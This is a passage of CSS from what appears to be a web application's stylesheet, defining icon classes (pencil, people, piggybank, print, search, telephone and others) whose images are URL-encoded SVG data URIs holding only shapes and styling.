14h12V26.99963z%0A%09%20M26%2C10.49963v1.5H14v-1.5c0-0.80005%2C0.70001-1.5%2C1.5-1.5h9C25.29999%2C8.99963%2C26%2C9.69958%2C26%2C10.49963z%22%2F%3E%0A%3C%2Fsvg%3E%0A");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-pencil[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_pencil%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M27%2C25.89l2-1.06V29a4%2C4%2C0%2C0%2C1-4%2C4H13a4%2C4%2C0%2C0%2C1-4-4V13a4%2C4%2C0%2C0%2C1%2C4-4H25a4%2C4%2C0%2C0%2C1%2C3.86%2C3.31L27%2C13.3V13a2%2C2%2C0%2C0%2C0-2-2H13a2%2C2%2C0%2C0%2C0-2%2C2V29a2%2C2%2C0%2C0%2C0%2C2%2C2H25a2%2C2%2C0%2C0%2C0%2C2-2Zm11.14-8L20%2C27.51H14.1l-1-1.88%2C3.25-4.82%2C0-.06L34.55%2C11.1ZM19.91%2C21.14l1.72%2C3.24%2C9.25-4.92-1.72-3.24Zm-.4%2C4.37.36-.19-1.72-3.24-.36.19L15.6%2C25.51ZM35.44%2C17%2C33.72%2C13.8l-2.8%2C1.49%2C1.72%2C3.24Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-people[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_people%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M28%2C19a5%2C5%2C0%2C1%2C0-5-5A5%2C5%2C0%2C0%2C0%2C28%2C19Zm0-8a3%2C3%2C0%2C1%2C1-3%2C3A3%2C3%2C0%2C0%2C1%2C28%2C11ZM14%2C19a5%2C5%2C0%2C1%2C0-5-5A5%2C5%2C0%2C0%2C0%2C14%2C19Zm0-8a3%2C3%2C0%2C1%2C1-3%2C3A3%2C3%2C0%2C0%2C1%2C14%2C11Zm.77%2C10.43A3.9%2C3.9%2C0%2C0%2C0%2C13%2C21a4%2C4%2C0%2C0%2C0-4%2C4H9v8H21V24.72l-6.19-3.29ZM19%2C31H11V25h0a2%2C2%2C0%2C0%2C1%2C2-2%2C3.51%2C3.51%2C0%2C0%2C1%2C1%2C.27l5%2C2.66Zm14-6h0v8H23V31h8V25a2%2C2%2C0%2C0%2C0-2-2%2C2%2C2%2C0%2C0%2C0-1%2C.3v0l-5%2C2.66V23.66l4.19-2.23A7.37%2C7.37%2C0%2C0%2C1%2C29%2C21%2C4%2C4%2C0%2C0%2C1%2C33%2C25Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-piggybank[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_piwwybank%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C1%2C41%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M25.74%2C18.37A5.55%2C5.55%2C0%2C0%2C0%2C22%2C17a5.62%2C5.62%2C0%2C0%2C0-3.62%2C1.25l-1.83-1a7.66%2C7.66%2C0%2C0%2C1%2C11%2C.12ZM32.36%2C17A7.5%2C7.5%2C0%2C0%2C1%2C33%2C20a8.38%2C8.38%2C0%2C0%2C1-4%2C6.87V31H15V26.87A9.22%2C9.22%2C0%2C0%2C1%2C11.7%2C23H9V17h2.72A8.41%2C8.41%2C0%2C0%2C1%2C13%2C15V9h2l4.36%2C2.28A12.69%2C12.69%2C0%2C0%2C1%2C22%2C11a11.68%2C11.68%2C0%2C0%2C1%2C9.36%2C4.28l1.4-.74.94%2C1.76ZM31%2C20c0-3.87-4-7-9-7a11.24%2C11.24%2C0%2C0%2C0-2.88.39L15%2C11.26v4.37A6.39%2C6.39%2C0%2C0%2C0%2C13.13%2C19H11v2h2.13A7.12%2C7.12%2C0%2C0%2C0%2C17%2C25.76V29h4V27h2v2h4V25.76C29.36%2C24.5%2C31%2C22.39%2C31%2C20Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-playbutton[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_play_button%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M29%2C11H13a6%2C6%2C0%2C0%2C0-6%2C6v8a6%2C6%2C0%2C0%2C0%2C6%2C6H29a6%2C6%2C0%2C0%2C0%2C6-6V17A6%2C6%2C0%2C0%2C0%2C29%2C11Zm4%2C14.19A4%2C4%2C0%2C0%2C1%2C29.2%2C29H12.81A4%2C4%2C0%2C0%2C1%2C9%2C25.19V16.81A4%2C4%2C0%2C0%2C1%2C12.81%2C13H29.2A4%2C4%2C0%2C0%2C1%2C33%2C16.81ZM18%2C26.34a1%2C1%2C0%2C0%2C1-1-1V16.66a1%2C1%2C0%2C0%2C1%2C.48-.86%2C1%2C1%2C0%2C0%2C1%2C1%2C0l8.17%2C4.33a1%2C1%2C0%2C0%2C1%2C0%2C1.77l-8.17%2C4.34A1%2C1%2C0%2C0%2C1%2C18%2C26.34Zm1-8v5.35L24%2C21Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-plus[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_plus%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpolygon%20class%3D%22cls-2%22%20points%3D%2230%2019%2021%2019%2021%2010%2019%2010%2019%2019%2010%2019%2010%2021%2019%2021%2019%2030%2021%2030%2021%2021%2030%2021%2030%2019%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-print[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_print%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M29%2C19h2v2H29Zm6%2C0v8H29v4H13V27H7V19a4%2C4%2C0%2C0%2C1%2C4-4h2V9H29v6h2A4%2C4%2C0%2C0%2C1%2C35%2C19ZM15%2C15H27V11H15Zm0%2C14H27V23H15Zm18-8V19a2%2C2%2C0%2C0%2C0-2-2H11a2%2C2%2C0%2C0%2C0-2%2C2v6h4V21H29v4h4Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-profile[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_profile%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M25%2C17a4%2C4%2C0%2C1%2C1-4-4%2C4%2C4%2C0%2C0%2C1%2C4%2C4m2%2C0a6%2C6%2C0%2C1%2C0-6%2C6%2C6%2C6%2C0%2C0%2C0%2C6-6m-6%2C7.39L9.36%2C30.58l.94%2C1.77L21%2C26.66l10.7%2C5.69.94-1.77Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-search[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_search%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M23%2C9a8%2C8%2C0%2C0%2C0-4.6%2C14.53L13%2C33.7l1.77.94%2C5.41-10.18A8%2C8%2C0%2C1%2C0%2C23%2C9Zm0%2C14a6%2C6%2C0%2C1%2C1%2C6-6A6%2C6%2C0%2C0%2C1%2C23%2C23Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-shopping[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_shoppinw_cart%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M41%2C21A20%2C20%2C0%2C1%2C1%2C21%2C1%2C20%2C20%2C0%2C0%2C1%2C41%2C21%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M29%2C33a2%2C2%2C0%2C1%2C1-2-2A2%2C2%2C0%2C0%2C1%2C29%2C33ZM17%2C31a2%2C2%2C0%2C1%2C0%2C2%2C2A2%2C2%2C0%2C0%2C0%2C17%2C31ZM31%2C15v6h0l-7.58%2C4v0H13a2%2C2%2C0%2C0%2C0%2C2%2C2H29v2H15a4%2C4%2C0%2C0%2C1-4-4V15H7V13h6v2Zm-2%2C2H13v6H23l6-3.2Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-talk[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_talk%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M31%2C19c0%2C3-2%2C5.51-5%2C6.89l-9%2C4.78V26.27c-3.52-1.24-6-4-6-7.27%2C0-4.42%2C4.48-8%2C10-8s10%2C3.58%2C10%2C8m2%2C0c0-5.52-5.37-10-12-10S9%2C13.48%2C9%2C19c0%2C3.69%2C2.42%2C6.88%2C6%2C8.6V34l12.94-6.88h0A9.54%2C9.54%2C0%2C0%2C0%2C33%2C19%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-telephone[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_telephone%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M31.11%2C31.49l-3.75-7.06-4.54%2C0-3.64-6.84%2C2.49-3.69L18%2C6.76h0L14.44%2C8.64h0A6%2C6%2C0%2C0%2C0%2C12%2C16.76h0l7.51%2C14.13h0a6%2C6%2C0%2C0%2C0%2C8.11%2C2.48h0l3.53-1.88Zm-4.47.11h0a4%2C4%2C0%2C0%2C1-5.41-1.65L13.72%2C15.82a4%2C4%2C0%2C0%2C1%2C1.65-5.41h0l1.77-.94%2C2.24%2C4.21-2.53%2C3.75h0l4.79%2C9h4.5l2.27%2C4.26-1.76.94Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-tiles[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_tiles%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M13%2C9a4%2C4%2C0%2C0%2C0-4%2C3.83H9V19H19V9Zm4%2C8H11V13a2%2C2%2C0%2C0%2C1%2C2-2h4Zm16-4a4%2C4%2C0%2C0%2C0-4-4H23V19H33V13Zm-2%2C4H25V11h4a2%2C2%2C0%2C0%2C1%2C2%2C2ZM9%2C23v6a4%2C4%2C0%2C0%2C0%2C4%2C4h6V23Zm8%2C8H13a2%2C2%2C0%2C0%2C1-2-2V25h6Zm6-8V33h6a4%2C4%2C0%2C0%2C0%2C4-4V23Zm6%2C8H25V25h6v4A2%2C2%2C0%2C0%2C1%2C29%2C31Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-upload[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_upload%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C1A20%2C20%2C0%2C1%2C0%2C41%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C1%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M9%2C19V17a6%2C6%2C0%2C0%2C1%2C6-6H27a6%2C6%2C0%2C0%2C1%2C6%2C6v2H31V17a4%2C4%2C0%2C0%2C0-4-4H15a4%2C4%2C0%2C0%2C0-4%2C4v2Zm11%2C6v8h2V25h3.62L21%2C17l-4.62%2C8Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-unlock[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_unlock%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M21%2C15V13h0A6%2C6%2C0%2C0%2C0%2C9%2C13H9v4h2V13a4%2C4%2C0%2C0%2C1%2C8%2C0v2H15V25a6%2C6%2C0%2C0%2C0%2C6%2C6h8a6%2C6%2C0%2C0%2C0%2C6-6V15ZM33%2C25a4%2C4%2C0%2C0%2C1-4%2C4H21a4%2C4%2C0%2C0%2C1-2.88-1.21L33%2C19.88V25Zm0-7.39L17.14%2C26A4%2C4%2C0%2C0%2C1%2C17%2C25h0V17H33Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-wear[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_wear%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M21%2C16a5%2C5%2C0%2C1%2C0%2C5%2C5A5%2C5%2C0%2C0%2C0%2C21%2C16Zm0%2C8a3%2C3%2C0%2C1%2C1%2C3-3A3%2C3%2C0%2C0%2C1%2C21%2C24Zm11-1.27a11.06%2C11.06%2C0%2C0%2C0%2C0-3.46l3.13-1.8-4-6.93L28%2C12.34a11.08%2C11.08%2C0%2C0%2C0-3-1.73V7H17v3.57a11%2C11%2C0%2C0%2C0-1.59.74%2C10.82%2C10.82%2C0%2C0%2C0-1.43%2C1l-3.1-1.79-4%2C6.93L10%2C19.27a11.28%2C11.28%2C0%2C0%2C0%2C0%2C3.46l-3.12%2C1.8h0l4%2C6.93L14%2C29.66a11.16%2C11.16%2C0%2C0%2C0%2C3%2C1.73V35h8V31.43a9.8%2C9.8%2C0%2C0%2C0%2C3-1.75l3.09%2C1.79%2C4-6.93Zm-1.6%2C6-2.57-1.48A8.72%2C8.72%2C0%2C0%2C1%2C23%2C30v3H19V30a9.23%2C9.23%2C0%2C0%2C1-4.84-2.77l-2.55%2C1.47-2-3.46%2C2.55-1.47a9.26%2C9.26%2C0%2C0%2C1%2C0-5.58L9.61%2C16.73l2-3.46%2C2.56%2C1.48A8.74%2C8.74%2C0%2C0%2C1%2C19%2C12V9h4v3a9.26%2C9.26%2C0%2C0%2C1%2C4.85%2C2.78l2.55-1.47%2C2%2C3.46L29.85%2C18.2a9.23%2C9.23%2C0%2C0%2C1%2C0%2C5.58l2.57%2C1.48Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-website[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_website%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M9%2C11V27a6%2C6%2C0%2C0%2C0%2C6%2C6H27a6%2C6%2C0%2C0%2C0%2C6-6V11Zm6%2C4V13h2v2Zm-2-2v2H11V13ZM31%2C27a4%2C4%2C0%2C0%2C1-4%2C4H15a4%2C4%2C0%2C0%2C1-4-4V17H31Zm0-12H19V13H31ZM18.61%2C21l8%2C.28-4.24%2C6.78L21%2C25.5l-5.3%2C2.82-.94-1.77%2C5.3-2.82Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-x[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_x%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpolygon%20class%3D%22cls-2%22%20points%3D%2227.78%2013.63%2026.36%2012.22%2020%2018.59%2013.64%2012.22%2012.22%2013.64%2018.59%2020%2012.22%2026.36%2013.64%2027.78%2020%2021.41%2026.36%2027.78%2027.78%2026.36%2021.41%2020%2027.78%2013.63%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-ensurance[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%0A%3C!--%20Generator%3A%20Adobe%20Illustrator%2022.0.1%2C%20SVG%20Export%20Plug-In%20.%20SVG%20Version%3A%206.00%20Build%200%29%20%20--%3E%0A%3Csvg%20version%3D%221.1%22%20id%3D%22Layer%5f1%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20x%3D%220px%22%20y%3D%220px%22%0A%09%20viewBox%3D%220%200%2040%2040%22%20style%3D%22enable-background%3Anew%200%200%2040%2040%3B%22%20xml%3Aspace%3D%22preserve%22%3E%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%09.st0%7Bfill%3A%23002A54%3B%7D%0A%3C%2Fstyle%3E%0A%3Cg%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M23.3576%2C25.86871l-1.00403-1.00494c-0.19495-0.19501-0.51196-0.19501-0.70697%2C0%0A%09%09c-0.19501%2C0.19495-0.19501%2C0.51196%2C0%2C0.70697l1.00397%2C1.005c0.586%2C0.586%2C1.53601%2C0.586%2C2.12103%2C0l0.02197-0.02301l3.44299-3.58698%0A%09%09c0.19-0.19904%2C0.18402-0.51501-0.01495-0.70703c-0.19904-0.19098-0.51703-0.18396-0.70703%2C0.01501%0A%09%09c-2.29797%2C2.39398-3.44696%2C3.59198-3.45001%2C3.59497C23.86859%2C26.06372%2C23.55261%2C26.06372%2C23.3576%2C25.86871z%22%2F%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M26.08002%2C10.81073L18%2C8.08173c-0.32397-0.10999-0.677-0.10999-1.00098%2C0.00104l-8.00201%2C2.72699%0A%09%09C8.39899%2C11.01373%2C8%2C11.55573%2C8%2C12.16473v8.61798c0%2C2.854%2C1.396%2C5.54303%2C3.77301%2C7.263l4.82599%2C3.49506%0A%09%09c0.53302%2C0.38495%2C1.26801%2C0.38599%2C1.80298%2C0.00195c0.70404-0.57495%2C1.18604-0.96399%2C1.45703-1.177%0A%09%09c1.27802%2C1.00903%2C2.88696%2C1.61505%2C4.64099%2C1.61505c4.14301%2C0%2C7.5-3.35706%2C7.5-7.5c0-3.23303-2.04999-5.98004-4.91797-7.03406%0A%09%09v-5.27997C27.08203%2C11.5567%2C26.68103%2C11.01367%2C26.08002%2C10.81073z%20M17.80298%2C30.77673%0A%09%09c-0.17896%2C0.12799-0.42395%2C0.12701-0.60199-0.00098l-4.82501-3.49402C10.25%2C25.74274%2C9%2C23.33575%2C9%2C20.78271v-8.61798%0A%09%09c0-0.2